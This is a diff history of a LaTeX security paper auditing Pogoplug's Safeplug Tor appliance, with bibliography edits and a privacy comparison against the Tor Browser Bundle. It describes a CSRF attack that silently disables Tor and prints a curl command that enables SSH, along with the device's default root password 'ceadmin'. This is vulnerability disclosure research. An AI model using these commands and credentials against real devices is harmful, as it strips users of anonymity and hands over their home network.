-It is critical for Safeplug to correct their engineering errors, particularly the vulnerability to silently disable Tor, in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.
+It is critical for Safeplug to correct their security errors, particularly the vulnerability to silently disable Tor, in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.
 
-% Note that IEEE does not put floats in the very first column - or typically
-% anywhere on the first page for that matter. Also, in-text middle ("here")
-% positioning is not used. Most IEEE journals/conferences use top floats
-% exclusively. Note that, LaTeX2e, unlike IEEE journals/conferences, places
-% footnotes above bottom floats. This can be corrected via the \fnbelowfloat
-% command of the stfloats package.
+{\footnotesize \bibliographystyle{acm}
+\bibliography{paper}}
 
-% conference papers do not normally have an appendix
-
-% trigger a \newpage just before the given reference
-% number - used to balance the columns on the last page
-% adjust value as needed - may need to be readjusted if
-% the document is modified later
-%\IEEEtriggeratref{8}
-% The "triggered" command can be changed if desired:
-%\IEEEtriggercmd{\enlargethispage{-5in}}
-
-% references section
-
-% can use a bibliography generated by BibTeX as a .bbl file
-% BibTeX documentation can be easily obtained at:
-% http://www.ctan.org/tex-archive/biblio/bibtex/contrib/doc/
-% The IEEEtran BibTeX style support page is at:
-% http://www.michaelshell.org/tex/ieeetran/bibtex/
-%\bibliographystyle{IEEEtran}
-% argument is your BibTeX string definitions and bibliography database(s)
-%\bibliography{IEEEabrv,../bib/paper}
-%
-% <OR> manually copy in the resultant .bbl file
-% set second argument of \begin to the number of references
-% (used to reserve space for the reference number labels box)
-\begin{thebibliography}{1}
-
-\bibitem{spymall} Appelbaum et. al. ``Shopping for Spy Gear: Catalog Advertises 
-NSA Toolbox'' \emph{Der Spiegel} 29 December 2013 \url{www.spiegel.de/internatio
-nal/world/catalog-reveals-nsa-has-back-doors-for-numerous-devices-a-940994.html}
-
-\bibitem{archforum} Arch Linux ARM Forums. ``Installation on the Pogoplug Series 4.'' \url{http://archlinuxarm.org/forum/viewtopic.php?f=3&t=2284&start=14&sid=11c74c51b7bab241186a8341ba953095}
-
-%\bibitem{nsa} Arther, Charles.  ``NSA scandal: what data is being monitored and how does it work?'' \url{http://www.theguardian.com/world/2013/jun/07/nsa-prism-records-surveillance-questions}.
-
-\bibitem{fingerprint1} Cai, Xiang, et al.
-``Touching from a distance: Website fingerprinting attacks and defenses.'' \emph{Proceedings of the 2012 ACM conference on Computer and Communications Security (CCS)}, 2012.
-
-\bibitem{ceadmin} Colleton, Lee. ``Fwd: SSH on Safeplug'' \emph{Tor-talk mailing list} 2 January 2014. \url{http://archives.seul.org/or/talk/Jan-2014/msg00003.html}
-
-\bibitem{tor} Dingledine, Roger, et. al. ``Tor: The second-generation onion router.'' \emph{USENIX Security Symposium}, 2004.
-
-\bibitem{dyer} Dyer, Kevin P., Coull, Scott E., Ristenpart, Thomas, and Shrimpton, Thomas.
-``Peek-a-boo, i still see you: Why efficient traffic analysis countermeasures fail.'' \emph{In Proceedings of the 33rd Annual IEEE Symposium on Security and Privacy}, 2012.
-
-\bibitem{panopticlick} Electronic Fronteir Foundation. ``Panopticlick.'' \url{https://panoptlick.eff.org}
-
-\bibitem{feamster} Feamster, Nick, and Dingledine, Roger.  ``Location Diversity in Anonymity Networks.''  \emph{In ACM Workshop on Privacy in the Electronic Society (WPES)}, 2004.
-
-\bibitem{fredrikson} Fredrikson, M., and Livshits, B. ``Repriv: Re-envisioning in-browser privacy.'' \emph{In Proceedings of the 2011 IEEE Symposium on Security and Privacy}, May 2011.
-
-\bibitem{guha} Guha, S., Cheng, B., and Francis, P.
-``Privad: Practical privacy in online advertising.'' \emph{In Proceedings of the 2011 USENIX Symposium on Networked Systems Design and Implementation}, April 2011.
-
-\bibitem{bittech} Halfacree, Gareth. ``Pogoplug launches Tor-powered Safeplug'' \emph{bit-tech.net} 25 November 2013, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.
-
-\bibitem{herrmann} Herrmann, Dominik, Wendolsky, Rolf, and Federrath, Hannes.
-``Website fingerprinting: attacking popular privacy enhancing technologies with the multinomial naive-bayes classifier.'' \emph{In Proceedings of the 2009 ACM workshop on Cloud computing security}.
-
-\bibitem{tor2} Johnson, Aaron, et al.
-``Users get routed: Traffic correlation on Tor by realistic adversaries.'' \emph{Proceedings of the 2013 ACM SIGSAC conference on Computer \& Communications Security (CCS)}, 2013.
-
-\bibitem{dropbear} Johnston, Matt. ``Dropbear SSH.'' \url{https://matt.ucc.asn.au/dropbear/dropbear.html}
-
-%\bibitem{fingerprint2} Kohno, Tadayoshi et. al. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.
-
-\bibitem{law} The Legal FAQ for Tor Relay Operators. \url{https://www.torproject.org/eff/tor-legal-faq}.
-
-\bibitem{lighttpd} Lighttpd. \url{http://www.lighttpd.net}
-
-\bibitem{marvellhw} Marvell, ``88F6190 and 88F6192 Integrated Controller Hardware Specifications'' 2 December 2008.
-\url{http://www.marvell.com//embedded-processors/kirkwood/assets/HW_88F619x_OpenSource.pdf}
-
-%\bibitem{marvell} Marvell, ``Marvell 88F6192 SoC with Sheeva Technology'' 2009. \url{http://www.marvell.com//embedded-processors/kirkwood/assets/88F6192-003_ver1.pdf}
-
-%\bibitem{marvell2} Marvell, ``Marvell Alaska 88E1116R'' 2007. \url{http://www.marvell.com/transceivers/assets/Marvell-Alaska-88E1116R-Single-Port-GbE.pdf}
-
-\bibitem{fourthparty} Mayer, Jonathan. ``FourthParty'' \url{http://fourthparty.info}
-
-\bibitem{commercial2} Mayer, Jonathan R., and John C. Mitchell. "Third-party web tracking: Policy and technology." \emph{IEEE Symposium on Security and Privacy (SP)}, 2012.
-
-%\bibitem{gigaom} Meyer, David.
-``Say hello to Safeplug, Pogoplug’s \$49 Tor-in-a-box for anonymous surfing'', \emph{GigaOm}, 21 November 2013.
-\url{http://gigaom.com/2013/11/21/say-hello-to-safeplug-pogoplugs-49-tor-in-a-box-for-anonymous-surfing/}.
-
-\bibitem{murdoch} Murdoch, S.J., Danezis, G.  ``Low-Cost Traffic Analysis of Tor.'' \emph{In IEEE Symposium on Security and Privacy (Oakland)}, 2005.
-
-\bibitem{murdoch2} Murdoch, S.J. and Zielinski, P.  ``Sampled Traffic Analysis by Internet-Exchange-Level Adversaries.'' \emph{In Privacy Enhancing Technologies (PET)}, 2007.
-
-\bibitem{overlier} Overlier, L. and Syverson, P.  ``Locating Hidden Servers.'' \emph{In IEEE Symposium on Security and Privacy (Oakland)}, 2006.
-
-\bibitem{panchenko} Panchenko, Andriy, Niessen, Lukas, Zinnen, Andreas, and Engel, Thomas.
-``Website fingerprinting in onion routing based anonymization networks.'' \emph{In Proceedings of the 10th Workshop on Privacy in the Electronic Society}, 2011.
-
-%\bibitem{pano} Panopticlick. \url{https://panopticlick.eff.org/}.
-
-\bibitem{pew} Pew Research Center.  ``Anonymity, Privacy, and Security Online.'', \url{http://www.pewinternet.org/files/old-media//Files/Reports/2013/PIP_AnonymityOnline_090513.pdf}.
-
-\bibitem{pogo} Pogoplug. ``Pogoplug'', \url{https://pogoplug.com}.
-
-\bibitem{safeplug} Pogoplug. ``Safeplug'', \url{https://pogoplug.com/safeplug}.
-
-\bibitem{privoxy} Privoxy. \url{https://www.privoxy.org}
-
-%\bibitem{schneier} Schneier, Bruce. ``Tor Appliance.'' \emph{Schneier on Security}, 27 November 2013. \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.
-
-\bibitem{arvindpets} Reisman, Dillon and Englehardt, Steven and Eubank, Christian and Zimmerman, Peter and Narayanan, Arvind.
-``Cookies that give you away: Evaluating the surveillance implications of web tracking.'' \emph{Manuscript}.
-2014.
-
-\bibitem{kernelcve} Security Database. ``Linux Linux Kernel 2.6.13.8 CVE'' \url{http://www.security-database.com/cpe.php?detail=cpe:/o:linux:linux_kernel:2.6.31.8}
-
-%\bibitem{techreview} Simonite, Tom.
-``Online Anonymity in a Box, for \$49'', \emph{MIT Technology Review}, 21 November 2013.
-\url{http://www.technologyreview.com/news/521676/online-anonymity-in-a-box-for-49/}.
-
-\bibitem{pogo4} SmallNetBuilder. ``Pogoplug Series 4 Reviewed.'' \url{http://www.smallnetbuilder.com/cloud/cloud-storage/486-pogoplug-series-4-reviewed}
-
-\bibitem{wired} Solon, Olivia.
-``Safeplug makes it super-easy to harness Tor\'s anonymity at home,'' \emph{Wired UK}, 22 November 2013.
-\url{http://www.wired.co.uk/news/archive/2013-11/22/safeplug-tor}.
-
-\bibitem{tormailinglist} Tor Mailing List.  \url{https://lists.torproject.org/pipermail/tor-talk/2013-November/031199.html}.
-
-\bibitem{orbot} ``Tor on Android.'' \emph{Tor Project.} Accessed February 2014. \url{https://torproject.org/docs/android.html.en}
-
-\bibitem{torproject} The Tor Project.  \url{https://www.torproject.org/}.
-
-\bibitem{amorbot} The Tor Project. ``Orbot: Proxy with Tor.'' \emph{Google Android Market}. Accessed 7 February 2014, \url{https://play.google.com/store/apps/details?id=org.torproject.android}
-
-\bibitem{toubiana} Toubiana, V., Narayanan, A., Boneh, D., Nissenbaum, H., and Barocas, S.
-``Adnostic: Privacy preserving targeted advertising.'' \emph{In Proceedings of the 2010 Network and Distributed System Security Symposium}, March 2010.
-
-%\bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.
-
-\bibitem{csrfdef} Zeller and Felten. ``Cross-Site Request Forgeries: Exploitation and Prevention.'' \emph{Princeton Technical Report}. 2008.
-
-\end{thebibliography}
-
-% that's all folks
 \end{document}

### 2014-04-23 foci/paper.tex
foci paper updates

@@
 \section{Background}
-{\bf Safeplug.} Safeplug \cite{safeplug}, is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
+{\bf Safeplug.} Safeplug \cite{safeplug}, is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor \cite{torproject} without having to know about it or how it works.
 It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49.
@@
 \begin{center}
-  \begin{tabular}{|l|c|c|}
+  \begin{tabular}{|l|c|c|c|}
     \hline
-    Safeplug Software & Version & Date \\ \hline
-    Linux Kernel & 2.6.31.8 & 2009 \\ \hline
-    Lighttpd Web Server & 1.4.33 & 2013 \\ \hline
-    Privoxy Proxy & 3.0.21 & 2013 \\ \hline
-    Tor & 0.2.3.25 & 2012 \\ \hline
-    Dropbear sshd & v0.52 & 2008 \\ \hline
+    Safeplug Software & Version & Date & Up To Date\\ \hline
+    Linux Kernel & 2.6.31.8 & 2009 & No\\ \hline
+    Lighttpd Web Server & 1.4.33 & 2013 & No\\ \hline
+    Privoxy Proxy & 3.0.21 & 2013 & Yes\\ \hline
+    Tor & 0.2.3.25 & 2012 & No\\ \hline
+    Dropbear sshd & v0.52 & 2008 & No\\ \hline
   \end{tabular}
@@
 
-The Safeplug runs version 2.6.31.8 of Arch Linux for ARM, which was produced at the end of 2009.
+Table \ref{versions} shows the software used by the device, the corresponding version of the software, as well as the date of that versions release and if it is up to date.
+There are many known vulnerabilities in the pieces of software that are not up to date.
+
+%The Safeplug runs version 2.6.31.8 of Arch Linux for ARM, which was produced at the end of 2009.
 Unsurprising for its age, there are a number of network vulnerabilities for this version of the kernel - most of which produce denial of service attacks if an adversary sends a particularly formed packet \cite{kernelcve}.
@@
 For example, although the Safeplug does not appear to use the recently patched GNUTLS library, if a similar problem had been discovered in one of the Safeplug's libraries, users would have to trust Safeplug to discover and apply the new patch.
-
-As mentioned in the instructions shown in Figure~\ref{fig:instructions}, the Safeplug has an online activation process during which it downloads the software packages it uses to function.
+%
+%As mentioned in the instructions shown in Figure~\ref{fig:instructions}, the Safeplug has an online activation process during which it downloads the software packages it uses to function.
 The software installed by the activation process on the Safeplug is in the \verb!/opt/xce!
 folder of the root filesystem and includes Lighttpd, Privoxy, and Tor.
-
-Lighttpd is an open-source web-server, which serves the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
+%
+%Lighttpd is an open-source web-server, which serves the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
 while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
@@
 Unlike Lighttpd and Privoxy, the Safeplug does not contain the most up-to-date version of Tor from when it was released.
-
-The fourth piece of software the device, which is not installed during the activation process and is in a different location (\verb!/usr/sbin!) is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
+%
+%The fourth piece of software the device, which is not installed during the activation process and is in a different location (\verb!/usr/sbin!) is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
 The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.
@@
 This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network.
-This Cross Site Request Forgery (CSRF) attack requires a nonmalicious insider user to visit a web page controlled by the attacker, allowing the attacker to send the POST to the Safeplug by performing an exhaustive search on the address space.
+This Cross Site Request Forgery (CSRF) attack requires a nonmalicious insider user to visit a web page controlled by the attacker, allowing the attacker to send the POST to the Safeplug.
+If the attacker does not know the IP address of the Safeplug, he can perform an exhaustive search on the address space.
 We implemented this attack with less than 20 lines of Javascript code.

### 2014-05-07 foci/paper.tex
added bibliography

@@
 \usepackage{listings}
+\usepackage{subfigure}
 
@@
 
-\thispagestyle{empty}
+%\thispagestyle{empty}
 
@@
 
-\setlength{\parskip}{1ex plus 2ex minus 2ex}
+%\setlength{\parskip}{1ex plus 2ex minus 2ex}
 
 \section{Introduction}
-Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data; anonymity has become the goal for many Internet users in order to protect themselves.
+Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data.
 A recent Pew study listed compromised emails/accounts, harassment, and stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility~\cite{pew}.
-According to the study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address, but despite their efforts, 59\% of users reported that they don't believe it is possible to become completely anonymous online~\cite{pew}.
-Users are dissatisfied with their ability to protect themselves and their data online and do not believe that they have the tools to solve the problem.
+According to the study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address, but despite their efforts~\cite{pew}.
+Despite this, users do not believe that they have the tools to solve the problem.
 
-The cloud storage company Pogoplug noticed the demand for online anonymity and in December of 2013 they released the Safeplug.
-This device is a small box that plugs into a user's home router and it claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online by routing all traffic through Tor~\cite{safeplug}.
-The Safeplug also claimed simple setup and the removal of any technical detail, as shown in Figure~\ref{fig:instructions}, the entire setup instructions that came with the device.
+In December of 2013, the cloud storage company, Pogoplug, released the Safeplug, which is a small box that plugs into a user's home router.
+It claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online by routing all traffic through Tor~\cite{safeplug}.
 Given Pogoplug's bold security claims about the Safeplug device, the device should be audited by a third-party.
@@
 
-\begin{itemize}
+\begin{itemize} \setlength{\itemsep}{.2mm}
 \item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor for outgoing traffic (see Figure \ref{fig:flow}).
@@
 Pogoplug made use of good security principles by using auditable open source software on their device, and has the laudable goal of making online security the standard for more users.
-However, even if the engineering vulnerabilities regarding settings modification and the CSRF attack are fixed by introducing proper authentication for modifying Safeplug settings, given the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network, there is little reason to use the Safeplug over the Tor Browser Bundle.
+However, given the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network, there is little reason to use the Safeplug over the Tor Browser Bundle.
 As well as the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
 
-\begin{figure}
-\centering
-\includegraphics[width=.45\textwidth]{instructions2}
-\caption{Setup instructions (and the only documentation) that came in the box with the Safeplug.
+%\begin{figure}
+%\centering
+%\includegraphics[width=.45\textwidth]{instructions2}
+%\caption{Setup instructions (and the only documentation) that came in the box with the Safeplug.
 Pogoplug highlights the ease of installing the device but does not give a clear indication of how the Safeplug functions.}
-\label{fig:instructions}
-\end{figure}
+%\label{fig:instructions}
+%\end{figure}
 
@@
 %\end{figure*}
+
+\begin{figure}[ht]
+ \centering
+ \subfigure[Top of board.]{
+  \includegraphics[width=.2\textwidth]{safeplug_listed_top}
+   \label{fig:top}
+   }
+ \subfigure[Bottom of board.]{
+  \includegraphics[width=.2\textwidth]{safeplug_hardware_new}
+   \label{fig:bottom}
+   }
+ \label{fig:circuit}
+ \caption[Safeplug circuit board after the teardown.  The explanation of the components is in the text.]{%
+  Safeplug circuit board after the teardown.  The explanation of the components is in the text.}
+\end{figure}
 
@@
 
-\begin{itemize} %\setlength{\itemsep}{2mm}
+\begin{itemize} \setlength{\itemsep}{.2mm}
 \item Plain Firefox (no use of the Safeplug device)
@@
 
-\begin{enumerate}
+\begin{enumerate} \setlength{\itemsep}{.2mm}
 \item Set up a web page with the Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor}.
@@
 SSH instructions for Pogoplug's other device (called Pogoplug) are widely available online and an email in the Tor-talk mailing list confirmed the instructions \cite{ceadmin}:
-\begin{lstlisting}
+%\begin{lstlisting}
+%curl --data ``'' http://<IP>/svc/xspctrl/enableSSHD
+%ssh root@<IP-of-Safeplug>
+%password: ceadmin
+%\end{lstlisting}
+
+{\tt \small
+\begin{verbatim}
 curl --data ``'' http://<IP>/svc/xspctrl/enableSSHD
@@
 password: ceadmin
-\end{lstlisting}
+\end{verbatim}
+}
 
@@
 To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.
-However there has been much prior research on the primary technology that the device uses: Tor.
-Additionally, the security vulnerabilities that Safeplug attempts to secure users against have been previously studied in great detail; these include fingerprinting and cookies.
+However there has been much prior research on the primary technology that the device uses, Tor, as well as the vuvlnerability of fingerprinting.
 
@@
 A significant area of research on Tor relates to diversity of autonomous systems (ASes).
-Feamster and Dingledine argue that a user's anonymity may be compromised by using geographically diverse ASes; when analyzing both sides of an anonymous path, it is more likely the same AS will appear in both sides of a long path than in a short path~\cite{feamster}.
-Murdoch and Zielinski also argue against AS diversity.
-They state that AS diversity does not improve security because traffic is routed through ASes at Internet exchange points (IXPs); therefore, an IXP can observe traffic that passes through multiple ASes~\cite{murdoch2}.
+Researchers argue that a user's anonymity may be compromised by using geographically diverse ASes~\cite{feamster, murdoch2}.
 There has also been proven traffic correlation attacks that are efficient on the Tor network~\cite{murdoch, overlier}.
-Johnson, Wacek, Jansen, Sherr, and Syverson evaluated Tor's security against reasonably realistic adversaries and contribute metrics that model security over time.
-They found that in a period of six months, 80\% of all users may be deanonymized by a reasonably realistic Tor-relay adversary.
-Johnson et al.
-take into account how the Tor network evolves over time when evaluating Tor's security~\cite{tor2}.
+Johnson, Wacek, Jansen, Sherr, and Syverson found that in a period of six months, 80\% of all users may be deanonymized by a reasonably realistic Tor-relay adversary~\cite{tor2}.
 While Safeplug does not introduce or modify how Tor is used, it routes all traffic through the Tor network; Safeplug is also vulnerable to the attacks found in prior research on Tor.
@@
 Previous research has shown that web page fingerprinting attacks are possible~\cite{dyer, herrmann, panchenko}.
-Cai, Zhang, Joshi, and Johnson introduced both a web page and website fingerprinting attack that defeats many recently proposed defenses, including cover traffic and randomized pipeling.
-They find that their attack is successful 83.7\% of the time when the defense is the use of Tor; the success rate decreases to 52.2\% when the defense is the use of Tor, randomized pipelining, padding packets to 1500 bytes, and adding cover traffic at a 1:1 ratio~\cite{fingerprint1}.
+Cai, Zhang, Joshi, and Johnson found that their fingerprinting attack is successful 83.7\% of the time when the defense is the use of Tor~\cite{fingerprint1}.
 These results can be extended to the security of Safeplug.
-Because Safeplug uses only Tor to anonymize users, it may be susceptible to this type of fingerprinting attack.
+Because Safeplug uses Tor to anonymize users, it may be susceptible to this type of fingerprinting attack.
 
@@
 
+%\theendnotes
+
 \end{document}

### 2014-05-07 foci/paper.tex
more edits to the paper

@@
 Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data.
-A recent Pew study listed compromised emails/accounts, harassment, and stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility~\cite{pew}.
-According to the study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address, but despite their efforts~\cite{pew}.
-Despite this, users do not believe that they have the tools to solve the problem.
+A recent Pew study listed compromised emails/accounts, harassment, and stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility; according to the study, 86\% of internet users have tried to become more anonymous online~\cite{pew}.
+Despite this, users do not believe that they have the tools to solve this problem.
 
@@
 It claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online by routing all traffic through Tor~\cite{safeplug}.
-Given Pogoplug's bold security claims about the Safeplug device, the device should be audited by a third-party.
 We conducted the first public third-party security audit of the Safeplug by analyzing the hardware, software, network behavior, and usability of the device.
@@
 \begin{itemize} \setlength{\itemsep}{.2mm}
-\item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor for outgoing traffic (see Figure \ref{fig:flow}).
+\item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor for outgoing traffic.
 \item Despite the use of Privoxy as an ad-blocker, the Safeplug does nothing to prevent users' browsers from collecting both first- and third-party tracking cookies, allowing users to be de-anonymized across websites despite the presence of Tor~\cite{arvindpets}.
@@
 Pogoplug made use of good security principles by using auditable open source software on their device, and has the laudable goal of making online security the standard for more users.
-However, given the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network, there is little reason to use the Safeplug over the Tor Browser Bundle.
-As well as the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
+However, there is little reason to use the Safeplug over the Tor Browser Bundle; in addition to the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
 
@@
 \subsection{Software on the Safeplug}
+\begin{table}[!t]
+\caption{Software and the corresponding version numbers on the Safeplug.}
 \label{versions}
@@
 \end{center}
+\end{table}
 
@@
 
-Figure \ref{fig:callgraph} shows the call graph for the modifying the settings page.
 When a user modifies the settings page, Javascript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
@@
 \label{tos}
-The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.
-First, the TOS are never presented to the user: they aren't presented in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
+The TOS are never presented to the user: they aren't presented in the Safeplug package or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
 
-The Safeplug makes uses several pieces of open source software.
+The Safeplug uses several pieces of open source software.
 A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
 The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead; instead, the reader sees a 404 error \cite{safeplug}.
-This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of Feburary 2014 \cite{tormailinglist}.
+This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of May 2014 \cite{tormailinglist}.
 Pogoplug does maintain an open source page at \url{https://pogoplug.com/opensource}, which describes several pieces of software for the Safeplug: the bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
@@
 The first step was to plug Safeplug into our router and activate our device.
-Our instructions are shown in Figure~\ref{fig:instructions}.
-We followed them, activated our device, and then ended on the configurations page.
-The configurations page shows a variety of platforms and browsers, shown in the table below, and links to proxy configuration instructions for each one.
+We followed the simple instructions, activated our device, and then ended on the configurations page.
+The configurations page shows a variety of platforms and browsers, shown in Table \ref{table_example}, and links to proxy configuration instructions for each one.
 The platforms presented include many popular desktop and mobile platforms.
@@
 While browsing the Internet, we experienced some pages in German and Swedish; if a user is not familiar with Tor, they may not understand why this is happening.
-We were also prompted with a request to ``Enter the name of the city where you usually sign in'' when we tried to log into our Google account, indicating that Google noticed we were trying to login from significantly ``unusual'' location.
+We were also prompted with a request to ``Enter the name of the city where you usually sign in'' when we tried to log into our Google account, indicating that Google noticed we were trying to login from an ``unusual'' location.
 
@@
 Most browsers require a trip to the browser settings to clear cookies (or not have them set in the first place).
-We used FourthParty to analyze the client's use of the Safeplug \cite{fourthparty}.
 When collecting data on the existence of third-party cookies, we analyzed two separate browsing sessions; they were both new sessions with no cookies.
@@
 These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
-The ad-block functionality on the Safeplug reduced, but did not eliminate these third-party cookies.
+The ad-block functionality on the Safeplug reduced, but did not eliminate, these third-party cookies.
 
@@
 Unlike the Tor Browser Bundle, Safeplug users do not even have the fingerprints of other users of the service to help hide their fingerprints.
-Allowing the user to use their own browsers significantly incrases the amount of variation and customization between users and therefore the likelihood of having a unique fingerprint.
+Allowing the user to use their own browsers significantly increases the amount of variation and customization between users and therefore the likelihood of having a unique fingerprint.
 This danger to anonymity (unlike cookies) is not even mentioned in the Safeplug FAQ page~\cite{safeplug}.
@@
 As we discovered during our software analysis, the Safeplug has a remote procedure call (RPC) capability.
-Implemented is a script called \verb!xspctrl!
+This is a script called \verb!xspctrl!
 found in \verb!/opt/xce/html/svc!.
-Particularly, functional calls to this script include the ability to enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
+Functional calls to this script include the ability to enable and disable all of the Safeplug settings, including Tor, ad block, and Tor relay.
 None of them require any arguments in the POST string.
@@
 Having a publicly available root password means that SSH is done effectively without authentication.
-We tried the SSH procedure twice, once before the Internet connection and activation, and once afterwards.
-Before the activation and update procedure, SSH was not available because the RPC server code was not running without Lighttpd being installed.
-However, once the box was updated and had Lighttpd installed, the SSH procedure was available and any adversary on the home network could log into the box and install malware, surveillance software, or virtually anything they desired.
+Once the box was activated and had Lighttpd installed, the SSH procedure was available and any adversary on the home network could log into the box and install malware, surveillance software, or virtually anything they desired.
 

### 2014-05-10 foci/paper.tex
blacked out anna's netid

@@
     \hline
-    Safeplug Software & Version & Date & Up To Date\\ \hline
+    Safeplug Software & Version & Date & Up To Date (as of May 2014)\\ \hline
     Linux Kernel & 2.6.31.8 & 2009 & No\\ \hline
@@
   \centering
-  \includegraphics[width=.75\textwidth]{disabletor}
+  \includegraphics[width=.75\textwidth]{disabletor2}
   \caption{Disabling Tor as an RPC attack.}

### 2014-05-12 foci/paper.tex
added section about privoxy vs tbb

--- 2014-05-07 foci/paper.tex
@@
 \item The Safeplug has a higher web request latency than that of the Tor Browser Bundle.
+\item The Tor Browser Bundle provides more protection than the use of Privoxy, and therefore the use of the Safeplug.
 \end{itemize}
@@
 Pogoplug made use of good security principles by using auditable open source software on their device, and has the laudable goal of making online security the standard for more users.
-However, there is little reason to use the Safeplug over the Tor Browser Bundle; in addition to the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
+However, there are other technologies available that aim to provide the same functionality, such as the Tor Browser Bundle; additionally, this technology is free.
+In order to determine if there is a market for the Safeplug, we measure the privacy implications between the different technologies.
+We show that there is little reason to use the Safeplug over the Tor Browser Bundle; in addition to the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
 
@@
 \begin{table}[!t]
-\caption{Software and the corresponding version numbers on the Safeplug.}
+\renewcommand{\arraystretch}{1.3}
+\caption{Software and the corresponding version numbers on the Safeplug as of May 2014.}
 \label{versions}
@@
 
+\section{Privoxy vs. Tor Browser Bundle}
+The Safeplug uses two primary technologies: Tor and Privoxy.
+The Tor Project has developed the Tor Browser Bundle, which is a free custom browser that uses Tor as well as other protection mechanisms to help preserve a user's privacy.
+The Tor Browser Bundle may be a better solution than the Safeplug if it has fewer privacy implications.
+The differentiating factor between the Safeplug and the Tor Browser Bundle is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must find the value of Privoxy in terms of privacy.
+We ran a measurement study of the privacy implications of the use of Firefox, Firefox with Privoxy, and the Tor Browser Bundle; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
+All browser configurations were modified with Pagestats \cite{pagestats} and Cookie Manager+ \cite{cookiemonster} to aggregate information about third party requests, javascript objects, flash objects, and third party cookies.
+Table \ref{tbb} shows the average number per page of: third party domains accessed, javascript objects received from third parties, flash objects received from third parties, and cookies received from third parties.
+
+\begin{table}[!t]
+\renewcommand{\arraystretch}{1.3}
+\caption{Privacy implications of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the average number per page.}
+\label{tbb}
+\centering
+	\begin{tabular}{| p{1.85cm} | p{1.3cm} | p{1.25cm} | p{.7cm} | p{1cm} |}
+	\hline
+		Configuration & Third Party Domains & Javascript & Flash & Cookies \\ \hline
+		Plain Firefox	& 0.64 & 0.01 & 0.01 & 0.88 \\ \hline
+		Privoxy & 0.72 & 0.00 & 0.01 & 0.84 \\ \hline
+		Tor Browser	& 0.58 & 0.01 & 0.00 & 0.00 \\ \hline
+	\end{tabular}
+\end{table}
+
+It is clear to see that the Tor Browser Bundle had the fewest privacy implications in most categories; it's interesting to note that the Tor Browser Bundle did not receive any cookies, where as both other configurations received a significant number of them.
+The one category where Privoxy performed better than the Tor Browser Bundle is in the number of javascript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows javascript (NoScript is disabled)~\cite{torproject}.
